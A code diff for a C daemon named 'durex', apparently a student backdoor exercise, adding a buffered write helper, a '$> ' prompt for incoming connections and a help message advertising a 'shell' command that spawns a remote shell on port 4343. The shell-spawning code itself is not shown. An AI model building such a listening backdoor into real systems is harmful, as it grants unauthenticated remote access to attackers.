@@ -1,4 +1,4 @@
-#include "../includes/durex.h"
+	#include "../includes/durex.h"
 
 fd_set readset, writeset;
 int max_connections = 0;
@@ -66,6 +66,20 @@ t_mem	*read_fd(int fd)
 		return (buf);
 	ft_free_mem(buf);
 	return (mem);
+}
+
+void	write_fd(int fd, t_mem *mem)
+{
+	int i;
+
+	i = -1;
+	while (++i * BUFFER < mem->len)
+	{
+		if (mem->len - (i * BUFFER) < 1024)
+			write(fd, &mem->data[i * BUFFER], mem->len - (i * BUFFER));
+		else
+			write(fd, &mem->data[i * BUFFER], BUFFER);
+	}
 }
 
 int		ft_create_serveur(t_daemon *daemon)
@@ -137,6 +151,7 @@ void	ft_exit(t_daemon *daemon, int status)
 void	handle_connection(t_daemon *daemon, int cs)
 {
 	t_mem *mem;
+	t_mem *mem2;
 
 	mem = NULL;
 	mem = read_fd(cs);
@@ -156,7 +171,10 @@ void	handle_connection(t_daemon *daemon, int cs)
 		close(cs);
 		ft_exit(daemon, -1);
 	}
+	if (ft_strequ(mem->data, "?") == 1)
+		write(cs, "?     show help\nshell spawn remote shell on 4343\n", ft_strlen("?     show help\nshell spawn remote shell on 4343\n"));
 	ft_free_mem(mem);
+	write(cs, "$> ", 3);
 }
 
 void	open_lock(t_daemon *daemon)
@@ -219,6 +237,7 @@ int	main(void)
 							if (i == daemon->sock)
 							{
 								cs = accept(daemon->sock, (struct sockaddr*)&sin, &sizesin);
+								write(cs, "$> ", 3);
 								if (max_connections > 2)
 								{
 										FD_CLR(cs, &readset);
